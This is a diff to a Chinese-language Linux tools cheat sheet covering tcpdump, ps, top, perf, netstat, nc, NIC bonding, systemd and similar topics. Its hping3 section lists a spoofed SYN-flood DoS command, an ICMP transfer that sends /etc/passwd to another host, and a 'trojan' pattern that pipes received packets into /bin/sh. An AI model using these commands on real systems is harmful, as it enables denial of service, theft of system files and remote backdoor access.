@@ -1,3 +1,10 @@
+# 源码和手册
+- 源码：
+>> 安装了linux了主机上 /usr/src/ 查看uname -ra一致的文件夹  
+>> 在线源代码 https://elixir.bootlin.com/linux/latest/source
+- 手册： https://www.kernel.org/doc/man-pages/  可以看到用户空间的命令和系统调用等分类
+- 手册：https://man7.org/linux/man-pages/man7/network_namespaces.7.html 可以看到网络命名空间解释
+
 # gdb
 ## 断点的添加、删除、查看
 可以根据行号、函数、条件生成断点堆栈的查看。<br>
@@ -155,6 +162,9 @@ splint功能：程序静态分析工具
 - ifconfig -a #显示多有端口，包括down的端口
  
 # tcpdump
+tcpdump 是BPF最著名的用户之一，用户可以定义一个包过滤表达式。只有匹配该表达式的数据包才会被捕获。如下所示，这个表达式可以被编译器简化为BPF字节码。  
+$sudo tcpdump -d "tcp dst port 80"  
+
 $tcpdump -w file.name –i any  查看所有端口的包并输出到文件file.name中<br>
 $tcpdump host sundown      打印所有进入或离开sundown的数据包
  或者tcpdump host 210.27.48.1<br>
@@ -163,7 +173,7 @@ $tcpdump host 210.27.48.1 and \ (210.27.48.2 or 210.27.48.3 \)
 $tcpdump -i eth0 src host hostname 截获主机hostname发送的所有数据v
 $tcpdump -i eth0 port 6653 截获主机interface eth0, 6653端口发送的所有数据<br>
 $tcpdump -i eth0 port 6653 or 8080 截获主机interface eth0, 6653或者8080端口发送的所有数据<br>
--n关闭地址解析<br>
+-n关闭地址转换（比如 IP 地址转换为主机名，port 80 转换为 http），如果没有这个参数的话抓包会比较慢<br>
 -e Print the link-level header on each dump line.<br>
 如果即时显示报文可以命令：tcpdump –eni eth0<br>
  
@@ -178,6 +188,13 @@ $tcpdump icmp -eni any 截获所有端口的ICMP协议的包，并实时打印�
 第八列为事物ID<br>
 第九列为seq<br>
 第十列为报文内容，ICMP报文头加ICMP报文Data的长度<br>
+  
+$tcpdump -eni eth0 -X  // -X 用于以 ASCII 码来展示 TCP 里面的数据  
+$tcpdump -w file.pcap 'dst port 443 && tcp[20]==22 && tcp[25]==1'  
+tcp[20]==22：这是提取了 TCP 的第 21 个字节（因为初始序号是从 0 开始的），由于 TCP 头部占 20 字节，TLS 又是 TCP 的载荷，那么 TLS 的第 1 个字节就是 TCP 的第 21 个字节，也就是 TCP[20]，这个位置的值如果是 22（十进制），那么就表明这个是 TLS 握手报文。tcp[25]==1：同理，这是 TCP 头部的第 26 个字节，如果它等于 1，那么就表明这个是 Client Hello 类型的 TLS 握手报文。  
+$tcpdump -w file.pcap 'tcp[tcpflags]&(tcp-rst) != 0' //滤出 TCP RST 报文, 这是tcpdump预定义了一些相对方便的过滤器的其中一种  
+$tcpdump -r file.pcap 'tcp[tcpflags] & (tcp-rst) != 0' -w rst.pcap // 读取已抓取的file.pcap报文内容，并过滤重新保存到文件rst.pcap中  
+$抓包文件中任何一个客户端报文（也就是源端口为高端口）的 TTL，如果它是 64、128 或 255，那说明这个抓包文件就是在客户端做的。反之，就是在服务端做的。  
 
 ## wireshark 解析指定协议，这里以vxlan协议为例
 - 查看enabled protocol,确保vxlan protocol处于enabled状态. Analyze ->Enabled Protocols->Vxlan
@@ -187,18 +204,43 @@ $tcpdump icmp -eni any 截获所有端口的ICMP协议的包，并实时打印�
 
 # ps
 - 查看所有进程： ps –A
+- 查看所有进程，使用标准语法：ps -ef
+- 查看所有进程，使用BSD语法： ps aux
 - 查看进程的端口号：ps –ef|grep program-name
 - 查看整条命令：ps -auxwww | grep 进程号
+- 查看指定进程：ps -p pid
+- 查看指定参数：ps -L -p 821 -o tid,pid,cpuid,ppid,args
 - 查看进程打开的所有文件： lsof –p 进程号
 - 查看线程属于哪个CPU： ps –eLo psr
 - 其中L是线程，o指明format, psr 是processor that process is currently assigned to.
 - 查看第五个参数psr为2的线程的所有参数：
 ps -eLo ruser,pid,ppid,lwp,psr,args | awk ‘{if($5==2) print $0}’
-- 查看进程下的线程：ps -T -p <pid>
+- 查看进程下的线程：`ps -T -p <pid>`
 - 查看进程13452的进程树，结果中{}表示线程： pstree -aps 13452
 
 # top
-常用的进程和资源消耗查询工具，可以查看开机时间、平均负载、进程线程的资源消耗等
+常用的进程和资源消耗查询工具，可以查看开机时间、平均负载、进程线程的资源消耗等  
+对于 top 命令来说，它只能显示整个节点中各项 CPU 的使用率，不能显示单个容器的各项 CPU 的使用率, 从每个容器的 CPU Cgroup 控制组里的 cpuacct.stat 的统计值中，可以比较快地得到整个容器的 CPU 使用率.
+## 平均负载
+显示的第一行后半部分 ```load average: 0.02, 0.01, 0.01```表示CPU平均负载，三个数字依次则是过去 1 分钟、5 分钟、15 分钟的平均负载。参考本文档CPU平均负载的阐述。
+## CPU占用比例
+第三行"%Cpu(s)"开头的这一行，你会看到一串数值，也就是"0.0 us, 0.0 sy, 0.0 ni, 99.9 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st"
+ - us是"user"的缩写，代表 Linux 的用户态 CPU Usage。普通用户程序代码中，只要不是调用系统调用（System Call），这些代码的指令消耗的 CPU 就都属于"us"。
+ - sy是 "system"的缩写，代表内核态 CPU 使用。例如系统调用read等操作
+ - wa是"iowait"的缩写，代表等待 I/O 的时间，这里的 I/O 是指 Disk I/O.例如上述read系统调用会向 Linux 的 Block Layer 发出一个 I/O Request，触发一个真正的磁盘读取操作。这时候，这个进程一般会被置为 TASK_UNINTERRUPTIBLE。而 Linux 会把这段时间标示成"wa"
+ - hi是"hardware irq"的缩写，代表 CPU 处理硬中断的开销。由于我们的中断服务处理需要关闭中断，所以这个硬中断的时间不能太长。例如，机器在网络收到一个网络数据包，网卡就会发出一个中断（interrupt）。相应地，CPU 会响应中断，然后进入中断服务程序。
+ - si是"softirq"的缩写，代表 CPU 处理软中断的开销。发生中断后的工作是必须要完成的，如果这些工作比较耗时那怎么办呢？Linux 中有一个软中断的概念（softirq），它可以完成这些耗时比较长的工作。大部分中断都是软中断。
+ - ni是"nice"的缩写，这里表示如果进程的 nice 值是正值（1-19），代表优先级比较低的进程运行时所占用的 CPU。
+ - st是"steal"的缩写，是在虚拟机里用的一个 CPU 使用类型，表示有多少时间是被同一个宿主机上的其他虚拟机抢走的。  
+ top命令通过读取进程的 /proc/[pid]/stat 文件来计算单个进程的CPU占用比例，计算公式：`进程的 CPU 使用率 =((utime_2 – utime_1) + (stime_2 – stime_1)) * 100.0 / (HZ * et * 1 )`  
+ top命令通过读取文件/proc/stat来计算整个系统的 CPU 使用率，可以通过man proc知道前 8 列数据正好对应 top 输出中"%Cpu(s)"那一行里的 8 项数据
+
+ ## 输出字段含义
+ -RES Resident Set Size 的缩写（RSS），简单来说它就是指进程真正申请到物理页面的内存大小。
+  >- 应用程序在申请内存的时候，比如说，调用 malloc() 来申请 100MB 的内存大小，malloc() 返回成功了，这时候系统其实只是把 100MB 的虚拟地址空间分配给了进程，但是并没有把实际的物理内存页面分配给进程。上一讲中，我给你讲过，当进程对这块内存地址开始做真正读写操作的时候，系统才会把实际需要的物理内存分配给进程。而这个过程中，进程真正得到的物理内存，就是这个 RSS 了。
+ -VIRT 虚拟地址空间大小,对应上面的实际的物理内存。
+
+## 进程状态
  - 输入top命令后的 S 列（也就是 Status 列）表示进程的状态： R、D、Z、S、I 等几个状态
    - R 是 Running 或 Runnable 的缩写，表示进程在 CPU 的就绪队列中，正在运行或者正在等待运行。
    - D 是 Disk Sleep 的缩写，也就是不可中断状态睡眠（Uninterruptible Sleep），一般表示进程正在跟硬件交互，并且交互过程不允许被其他进程或中断打断。
@@ -212,7 +254,7 @@ ps -eLo ruser,pid,ppid,lwp,psr,args | awk ‘{if($5==2) print $0}’
 查看CPU信息： cat /proc/cpuinfo
                /sys/devices/system/cpu/<br>
  - 物理核数: grep 'physical id' /proc/cpuinfo|sort|uniq|wc -l 
- - 逻辑核数: cat /proc/cpuinfo| grep "processor"|wc -l
+ - 逻辑核数: cat /proc/cpuinfo| grep -i "processor"|wc -l
  
 taskset -p [mask] pid 。<br>
 其中，mask是一个代表了处理器亲和性的掩码数字，转化为二进制表示后，它的值从最低位到最高位分别代表了第一个逻辑CPU到最后一个逻辑CPU，进程调度器可能将该进程调度到所有标为“1”的位代表的CPU上去运行。根据上面的输出，taskset运行之前，QEMU线程的处理器亲和性mask值是0x3（其二进制值为：0011），可知其可能会被调度到cpu0和cpu1上运行；而运行“taskset -p 0x4 3967”命令后，提示新的mask值被设为0x4（其二进制值为：0100），所以该进程就只能被调度到cpu2上去运行，即通过taskset工具实现了vCPU进程绑定到特定的CPU上。<br>
@@ -223,11 +265,15 @@ CPU负载用uptime, 或者w命令和top命令也行<br>
 (以上命令中的2是间隔2秒显示一次的意思，也可以为1,3…)
 
 ## 平均负载
-平均负载是指单位时间内，系统处于可运行状态和不可中断状态的平均进程数，也就是平均活跃进程数，它和 CPU 使用率并没有直接关系。这里我先解释下，可运行状态和不可中断状态这俩词儿。所谓可运行状态的进程，是指正在使用 CPU 或者正在等待 CPU 的进程，也就是我们常用 ps 命令看到的，处于 R 状态（Running 或 Runnable）的进程。平均活跃进程数，直观上的理解就是单位时间内的活跃进程数，但它实际上是活跃进程数的指数衰减平均值(被消耗掉的cpu个数)。这个“指数衰减平均”的详细含义你不用计较，这只是系统的一种更快速的计算方式，你把它直接当成活跃进程数的平均值也没问题。一般平均负载超过70%就需要留心了。
+平均负载是指单位时间内，系统处于可运行状态和不可中断状态的平均进程数，也就是平均活跃进程数，它和 CPU 使用率并没有直接关系。`Load Average= 可运行队列进程平均数 + 休眠队列中不可打断的进程平均数`,这也是为什么有时候平均负载会高于CPU使用率。因为我们常用的系统CPU使用率不计算D状态进程。
+这里我先解释下，可运行状态和不可中断状态这俩词儿。所谓可运行状态的进程，是指正在使用 CPU 或者正在等待 CPU 的进程，也就是我们常用 ps 命令看到的，处于 R 状态（Running 或 Runnable）的进程。平均活跃进程数，直观上的理解就是单位时间内的活跃进程数，但它实际上是活跃进程数的指数衰减平均值(被消耗掉的cpu个数)。这个“指数衰减平均”的详细含义你不用计较，这只是系统的一种更快速的计算方式，你把它直接当成活跃进程数的平均值也没问题。一般平均负载超过70%就需要留心了。
 比如当平均负载为 2 时，意味着什么呢？
  - 在只有 2 个 CPU 的系统上，意味着所有的 CPU 都刚好被完全占用。
  - 在 4 个 CPU 的系统上，意味着 CPU 有 50% 的空闲。
  - 而在只有 1 个 CPU 的系统中，则意味着有一半的进程竞争不到 CPU。
+
+ ### 平均负载和CPU消耗的关系
+ 当没有D状态的进程时，平均负载等于CPU消耗；但是当有D状态进程时，平均负载要高于CPU Usage. 可以通过`ps aux|grep "D"` 来查看D状态进程。
 
  ## 性能指标工具
   详见同目录下的图《cpu性能分析工具》
@@ -242,6 +288,8 @@ CPU负载用uptime, 或者w命令和top命令也行<br>
 - yum install kernel-modules-extra centos安装扩展模块
 > 注意安装模块时，模块的版本要和系统版本一致，否则无用。可以用hostnamectl查看系统信息，然后 ```yum install module-version```来指定版本安装
  
+# pktgen
+
 # netstat
 $netstat -apn|grep 8000 查看所有端口号为8000的程序连接
 会输出：
@@ -249,10 +297,28 @@ $netstat -apn|grep 8000 查看所有端口号为8000的程序连接
  
 $netstat –au列出所有udp端口<br>
 $netstat –at 列出所有tcp端口<br>
+$netstat -ant 获取当前的 TCP、UDP 等的连接信息<br>
 $netstat –l  显示监听端口<br>
 $ netstat –tulnp<br>
 $netstat -ntu | tail -n +3 | awk '{print $5}' | sort | uniq -c | sort -nr <br>
-通过 netstat 的信息，把与本地相关的各种状态的 IP 都计数，排序列出来。
+通过 netstat 的信息，把与本地相关的各种状态的 IP 都计数，排序列出来。  
+$netstat -s 可以看到协议的收发汇总，以及错误信息  
+$netstat -i 查看有没有丢包  
+$watch --diff netstat -s 查看变化
+$ netstat -r //查看路由  
+# nc
+传输层工具
+nc 也叫 ncat 是netcat 的缩写, 但在ubuntu中没有ncat. 用 `yum install nmap-ncat -y` 安装
+在一个终端中敲命令  
+$nc -ul 127.0.0.0 9997 开启一个UDP server, 监听9997端口  
+再同主机的另一个终端中敲命令
+$nc -u 127.0.0.0 9997   
+test  
+// test字符就传送到了第一个server中
+
+$nc -w 2 -zv www.baidu.com 443 //和telnet功能类似  
+
+
 
 # ss
 ss is used to dump socket statistics.
@@ -268,6 +334,29 @@ ss -o state established '( dport = :http or sport = :http )' 显示所有已建�
 ss -x src /tmp/.X11-unix/* 找出所有连接X服务器的进程
 ss -s 列出当前socket详细信息
 ```
+
+# traceroute
+```
+traceroute www.baidu.com -I //  -I 参数（I 代表 ICMP）  
+
+ mtr www.baidu.com -r -c 10 // mtr 还能实现丰富的探测报告。尤其是它对每一跳的丢包率的百分比  
+```
+
+# hping3
+hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试，压力测试(DOS)，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。
+ - ping服务：hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
+ - 数据包跟踪：hping3 –traceroute -V -1 www.baidu.com（类似于traceroute www.baidu.com）
+ - 端口扫描：hping3 -I eth0  -S 192.168.10.1 -p 80
+            hping3 -8 1-1024 192.168.100.102
+ - 拒绝服务攻击：对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。此外还能进行Sync flood攻击、TCP flood攻击、ICMP flood攻击、UDP flood攻击等多种DOS攻击.
+    hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
+ - 文件传输：在接收端开启服务：hping3 192.168.1.159--listen signature --safe  --icmp  
+            在发送端使用签名打包的ICMP包发送文件：hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
+ - 木马功能：在木马启动端：hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh  
+            在远程控制端：
+            `echo ls >test.cmd
+            hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd`
+
  
 # wireshark
 ### 过滤源ip、目的ip
@@ -281,6 +370,7 @@ Ip.addr==8.8.8.8
 连接符and的使用。过滤两种条件时，使用and连接，如过滤ip为192.168.101.8并且为http协议的，ip.src==192.168.101.8 and http。<br>
 # nmap
 # netperf
+传输层工具  
  Netperf是一种网络性能的测量工具，主要针对基于TCP或UDP的传输。主要用来测试吞吐量。Netperf工具以client/server方式工作。server端是netserver，用来侦听来自client端的连接，client端是netperf，用来向server发起网络测试。测试过程中，在服务器上运行serverperf，同时在客户端上运行netperf。Netperf和netserver都是可执行脚本。
 ## 安装方法
 ```
@@ -364,6 +454,7 @@ net.ipv4.tcp_syn_retries = 2
 ```
 （2）dmesg查看linux内核的环形缓冲区信息，我们可以从中获得诸如系统架构、cpu、挂载的硬件，RAM等多个运行级别的大量的系统信息
 # AB
+应用层工具  
 安装 yum install httpd-tools
 ab是http压测工具，默认发起的是http1.0连接，但应答可能是http1.1或者http2.0
 ### Get某个文件
@@ -398,6 +489,7 @@ iperf3 -c 172.18.8.129  --cport 5201 --bind 172.18.8.130
 其中172.27.36.100是server端地址; -u 打UDP包，打流带宽为900m, -i为显示报告间隔
 
 # wrk
+应用层工具  
 wrk是高性能http压测工具(如果github打不开，可用码云https://gitee.com/mirrors/wrk)
 ## 安装wrk
 ```
@@ -406,6 +498,8 @@ cd wrk
 make
 # 将可执行文件移动到 /usr/local/bin 位置
 sudo cp wrk /usr/local/bin
+172.18.8.130 上有x86版本
+172.18.8.44  上有arm版本
 ```
 
 ## 运行wrk
@@ -474,6 +568,8 @@ ethtool eth0 查看网卡eth0的基本信息<br>
 ethtool –T eth0 Show time stamping capabilities, 是否支持PTP等<br>
 查看全部网卡信息：cat /proc/net/dev<br>
 查看虚拟网卡信息：cat /sys/devices/virtual/net/<br>
+查看网卡特性：ethtool -k enp0s3 | grep offload  
+关闭网卡特性： sudo ethtool -K enp0s3 tso off
 ### 设定网卡固定IP
 固定IP地址、DNS、默认路由
 ```
@@ -530,6 +626,62 @@ GRUB_DISABLE_RECOVERY="true"
 
 4. 重启服务器生效
 
+### 网卡绑定
+1. 加载bonding模块： modprobe bonding； lsmod |grep bonding 
+2. 创建虚拟的绑定网卡，例如 bond0:
+```
+[root@bogon network-scripts]# cat ifcfg-bond0 
+DEVICE=bond0
+ONBOOT=YES
+BOOTPROTO=static
+IPADDR=172.20.0.51
+PREFIX=24
+BONDING_OPTS="miimon=100 mode=1"
+```
+3. 绑定两个网卡，主备模式，把原有的配置ip信息去掉
+```
+[root@bogon network-scripts]# cat ifcfg-enp35s0f0
+NAME=enp35s0f0
+DEVICE=enp35s0f0
+ONBOOT=yes
+BOOTPROTO=none
+MASTER=bond0
+SLAVE=yes
+[root@bogon network-scripts]# 
+[root@bogon network-scripts]# cat ifcfg-enp35s0f1
+NAME=enp35s0f1
+DEVICE=enp35s0f1
+ONBOOT=yes
+BOOTPROTO=none
+MASTER=bond0
+SLAVE=yes
+[root@bogon network-scripts]# 
+```
+4. 重启网络，后如下所示：
+```
+enp35s0f0和enp35s0f1绑定成bond0网卡
+
+6: enp35s0f0: <BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP> mtu 1500 qdisc mq master bond0 state UP qlen 1000
+    link/ether e8:61:1f:39:4c:78 brd ff:ff:ff:ff:ff:ff
+7: enp35s0f1: <BROADCAST,MULTICAST,SLAVE,UP,LOWER_UP> mtu 1500 qdisc mq master bond0 state UP qlen 1000
+    link/ether e8:61:1f:39:4c:78 brd ff:ff:ff:ff:ff:ff
+10: bond0: <BROADCAST,MULTICAST,MASTER,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP qlen 1000
+    link/ether e8:61:1f:39:4c:78 brd ff:ff:ff:ff:ff:ff
+    inet 172.20.0.51/24 brd 172.20.0.255 scope global bond0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::ea61:1fff:fe39:4c78/64 scope link 
+       valid_lft forever preferred_lft forever
+
+```
+
+### 网卡解绑
+```
+1. 查看绑定情况：cat /proc/net/bonding/bond0
+2. 删除绑定网卡配置 /etc/sysconfig/network-scripts/ifcfg-bond0 
+3. 修改两块真实网卡信息 /etc/sysconfig/network-scripts/ifcfg-enp35s0f0 和 ifcfg-enp35s0f1
+```
+
+
 
 # lspci
 list all PCI devices，目前主机上面所有的硬件配备<br>
@@ -578,7 +730,45 @@ thread就是每个core的硬件线程数，即超线程
 rpm -qf `which ping` 查看，找到ping属于哪个软件包，下载软件包的源代码就可以看了
 
 # perf
-linux内核支持的软件性能分析的工具
+linux内核支持的软件性能分析的工具, perf 可以对指定的进程或者事件进行采样，并且还可以用调用栈的形式，输出整个调用链上的汇总信息。使用前需要安装符号表,如果用RPM包注意要和内核版本一致
+```
+# Ubuntu
+$ apt-get install linux-image-`uname -r`-dbgsym
+$ apt install linux-tools-common 
+# CentOS
+$ yum --enablerepo=base-debuginfo install -y kernel-debuginfo-$(uname -r)
+$ yum install perf 
+
+```
+```
+# 采样30s后退出
+$ perf record -a -g -- sleep 60
+$ perf record -a -g -p 9 -- sleep 30
+$ perf report
+```  
+在上述命令结束后，执行 perf report命令就可以得到 perf 的汇总报告. 展开可以看到调用链。另外，针对 perf 汇总数据的展示问题，可构造火焰图，需要安装FlameGraph工具。  
+```
+git clone https://github.com/brendangregg/FlameGraph.git   
+perf script -i perf.data &> perf.unfold                        //生成脚本文
+FlameGraph/stackcollapse-perf.pl perf.unfold &> perf.folded           
+FlameGraph/flamegraph.pl perf.folded > perf.svg    
+用浏览器打开Svg文件即可。
+```
+ - y 轴表示调用栈，每一层都是一个函数。调用栈越深，火焰就越高，顶部就是正在执行的函数，下方都是它的父函数。
+ - x 轴表示抽样数，如果一个函数在 x 轴占据的宽度越宽，就表示它被抽到的次数多，即执行的时间长。注意，x 轴不代表时间，而是所有的调用栈合并后，按字母顺序排列的。
+ - 火焰图就是看顶层的哪个函数占据的宽度最大。只要有"平顶"（plateaus），就表示该函数可能存在性能问题。
+ - 颜色没有特殊含义，因为火焰图表示的是 CPU 的繁忙程度，所以一般选择暖色调。
+
+$ perf probe --add do_sys_open //添加探针
+$ perf record -e probe:do_sys_open -aR sleep 10 //采样
+$ perf record -C 32 -g -- sleep 10 // 针对CPU32采样（-a参数表示所有CPU）10秒钟，-g 是指 call-graph enable，也就是记录函数调用关系
+$ perf record  -e cycles -c 10000 -- sleep 1 // 针对cycles事件每发生10000次采样1次，这样采样1秒钟。如果不指定事件默认采集所有Hardware event cycles
+$ perf record -e cycles -F 99 -- sleep 1 ，就是指采样每秒钟做 99 次// F表示采样每发生99次事件做一次采样
+$ perf stat -e page-faults -- sleep 1 // 查看1秒内事件page-faults发生了多少次
+$ perf script //查看采样结果
+$ perf probe -V do_sys_open //可以查看系统调用do_sys_open的参数
+$ perf trace --no-syscalls --event 'net:*' ping <ip> -c1  // 可用于定位ping不通的问题
+```
 
 # dig, nslookup 查看域名方法
 
@@ -595,6 +785,9 @@ gunzip filename.gz
 ## *tar.gz文件
   tar cvf name.tar.gz name/
   tar xvf name.tar.gz
+
+  tar zcvf name.tar.gz name/
+  tar zxvf name.tar.gz
 
 ## *.tar文件
 *.tar: tar -xf
@@ -627,6 +820,14 @@ gunzip filename.gz
 ```
 ls -lact --full-time /etc/|tail -1|awk '{print $6,$7}'
 ```
+## 系统时钟相关
+ HZ 是什么意思呢？ 系统ticks 是按照固定频率发生的，在我们的 Linux 系统里 1 秒钟是 100 次，那么 HZ 就是 1 秒钟里 ticks 的次数，这里值是 100。可以通过命令`getconf CLK_TCK`来查看HZ数值。
+
+## 查看linux版本信息
+- uname -ra
+- cat /proc/version
+- 查看gcc版本： gcc -v
+- 查看glibc版本： ldd --version
 
 ## 制作安装U盘
  1. 安装最新最新版ultraISO，试用版也可以
@@ -640,6 +841,8 @@ ls -lact --full-time /etc/|tail -1|awk '{print $6,$7}'
  3. 根据提示按ctrl+x保存配置进行安装
  4. 选择Date和安装类行（minimal,勾选DevelopmentTool）
  5. 选择Install Destination, 如果提示不行，多试试按键找到Reclaim Space清空硬盘再试
+ 6. 如果选择磁盘后报错，说明磁盘未准备好。需要对磁盘进行RAID，并进行格式化。以华为2288HV5为例，按DEL键进入DeviceManager-->AVAGO MegaRAID. 先Clear,然后选择所有好的硬盘进行创建virtual device.最后查看这些设备进行FastFormat. 也可以到DeviceManager-->AVAGO MegaRAID-->create xx的里面Default Initialization选fast（这里只有在创建磁盘的时候才能选fast. 注意观察硬盘是否都是好的，要把坏的硬盘拿出来进行创建RAID）
+ https://blog.csdn.net/qq_21410965/article/details/124648158  
 
 # 守护进程方法
 ## systemd
@@ -675,6 +878,7 @@ systemctl restart skynet-server //重启程序
  - journalctl -ru kubelet 查看kubelet当前日志
  - journalctl -fu kubelet  实时查看kubelet日志更新
  - journalctl -k  查看内核日志（不显示应用日志）
+  > - 比dmesg功能更强大，dmesg 是 print or control the kernel ring buffer
  - journalctl -b  查看系统本次启动的日志
  - journalctl --since="2012-10-30 18:17:16" 
  - journalctl --since "20 min ago"
@@ -740,7 +944,8 @@ redhat使用的一种开机自启动方式.
  - chkconfig --level 35 mysqld on #设定mysqld在等级3和5为开机运行服务，--level 35表示操作只在等级3和5执行，on表示启动，off表
 系统开机时启动的部分服务存储在/etc/init.d/目录下。我们可以把需要开机启动的服务放在这个目录下然后用chkconfig来管理。
 ```# chkconfig: 2345 20 80```
-表示脚本应该在运行级 2,3,4,5 启动，启动优先权为20，停止优先权为80。
+表示脚本应该在运行级 2,3,4,5 启动，启动优先权为20，停止优先权为80。  
+<font color='red'>注意，这里脚本的名称不能和已经存在的Systemctl管理的服务名称重名！</font>  
 
 # vimdiff 
 自带的文本比较与merge工具
@@ -766,6 +971,13 @@ Cache：缓冲区，高速缓存，是位于CPU与主内存间的一种容量较
 Buffer：缓冲区，一个用于存储速度不同步的设备或优先级不同的设备之间传输数据的区域。例如内存总是向磁盘写文件，但是每次都写的很小的内容，那么可以先把这些文件先放到一个篮子里buffer,等攒得多了再向磁盘写入。buffer是块设备的读写缓冲区
 ## swap
 swap:  交互分区，也就是从硬盘划分的虚拟内存，当物理内存不够用的时候会把缓存区（cache/buffer）的一些进程到swap中。
+### swappiness参数
+也就是/proc/sys/vm/swappiness 的值,用于决定系统将会有多频繁地使用交换分区。常常有3个取值：0,60,100
+两种内存类型 Page Cache 和 RSS ，在有磁盘文件访问的时候，Linux 会尽量把系统的空闲内存用作 Page Cache 来提高文件的读写性能。在没有打开 Swap 空间的情况下，一旦内存不够，这种情况下就只能把 Page Cache 释放了，而 RSS 内存是不能释放的。在 RSS 里的内存，大部分都是没有对应磁盘文件的内存，比如用 malloc() 申请得到的内存，这种内存也被称为匿名内存（Anonymous memory）。那么当 Swap 空间打开后，可以写入 Swap 空间的，就是这些匿名内存。  
+所以在 Swap 空间打开的时候，问题也就来了，在内存紧张的时候，Linux 系统怎么决定是先释放 Page Cache，还是先把匿名内存释放并写入到 Swap 空间里呢？我们一起来分析分析，都可能发生怎样的情况。最可能发生的是下面两种情况：第一种情况是，如果系统先把 Page Cache 都释放了，那么一旦节点里有频繁的文件读写操作，系统的性能就会下降。还有另一种情况，如果 Linux 系统先把匿名内存都释放并写入到 Swap，那么一旦这些被释放的匿名内存马上需要使用，又需要从 Swap 空间读回到内存中，这样又会让 Swap（其实也是磁盘）的读写频繁，导致系统性能下降。显然，我们在释放内存的时候，需要平衡 Page Cache 的释放和匿名内存的释放，而 swappiness，就是用来定义这个平衡的参数。
+- 当该值为100时：匿名内存和 Page Cache 内存的释放比例就是 100: 100，也就是等比例释放了。
+- 当该值为60时：该值为缺省值，匿名内存和 Page Cache 内存的释放比例就是 60:140，Page Cache 内存的释放要优先于匿名内存。
+- 当该值为0时：也不能完全禁止 Swap 分区的使用，就是说在内存紧张的时候，也会使用 Swap 来回收匿名内存。
 ## DMA
 DMA：是一种无需CPU的参与就可以让外设和系统内存之间进行双向数据传输的硬件机制。使用DMA可以大大提高IO吞吐率。
 ## mmap
@@ -781,7 +993,16 @@ mmap: 是一种内存映射文件的方法，即将一个文件或者其它对�
 ## 自动初始化环境变量
 环境变量放在/root/.bashrc文件中，当登录一个终端时，会执行这个文件中的命令
 
-常在/etc/profile文件中修改环境变量，在这里修改的内容是对所有用户起作用的。使用修改.bashrc文件进行环境变量的编辑，只对当前用户有用。使用修改 /etc/profile 文件进行环境变量的编辑，是对所有用户有用，并且是永久有效的。
+常在/etc/profile文件中修改环境变量，在这里修改的内容是对所有用户起作用的。使用修改.bashrc文件进行环境变量的编辑，只对当前用户有用。使用修改 /etc/profile 文件进行环境变量的编辑，是对所有用户有用，并且是永久有效的。  
+
+另外，/etc/init.d 和/etc/rc.local 都是开机自启动脚本，其中 /etc/init.d 类似于注册器一般用来拉起系统进程和服务；/etc/rc.loca是在系统初始化级别脚本运行之后再执行的，常用于客制化自启动服务。/etc/rc.d/init.d/ 会自动同步和/etc/init.d/一样。
+
+注意：
+- 要给该文件添加可执行权限否则开机不生效
+- 对于ubuntu系统要开启rc.local服务, sudo systemctl status rc-local 查看该服务状态  
+  > - 先执行systemctl enable rc-local; systemctl start rc-local;
+  > - chmod +x /etc/rc.local
+  > - 如果没有/etc/rc.local则创建一个，并且第一句要是#!/bin/bash;然后再重启服务
 ## 命令重命令
 ```
 alias rm='rm -i' //rename command rm
@@ -799,6 +1020,11 @@ oom_score_adj的取值范围是-1000～1000，0表示用户不调整oom_score，
 # rpm
  - rpm -qa|grep kube 查找所有kube相关软件
  - rpm -e xxx 删除指定软件
+ - rpm -ivh 包全名 //安装软件
+ - rpm --force //强制安装: 覆盖原版本，忽略包之间的冲突
+ - rpm --nodeps // 不验证包之间的依赖
+ 
+
 
 # yum 安装
 有时候卸载linux软件会把yum工具误删，可通过如下方法安装
@@ -839,6 +1065,16 @@ r=4，w=2，x=1
 若要 r-x 属性则 4+1=5。
 因此，640属性的文件表示owner用户可读可写不可执行；group用户可读不可写不可执行；other用户不可读不可写不可执行；
 
+# privilege
+可以通过https://man7.org/linux/man-pages/man7/capabilities.7.html 查看Linux 的所有的 capabilities 特权
+```
+用特权模式运行容器
+docker run --name iptables --privileged -it registry/iptables:v1 bash
+
+getcap /usr/bin/ping 查看ping进程当前cap
+setcap cap_net_admin,cap_net_raw+p /usr/bin/ping 设置ping进程cap
+```
+
 
 # 如何找到疯狂打印日志的进程
 ```
@@ -871,3 +1107,6 @@ ulimit -n 1048576 //临时配置可打开文件数
 ```
 ||
 |:--|
+
+# file 
+file -h /bin/sh //显示文件类型
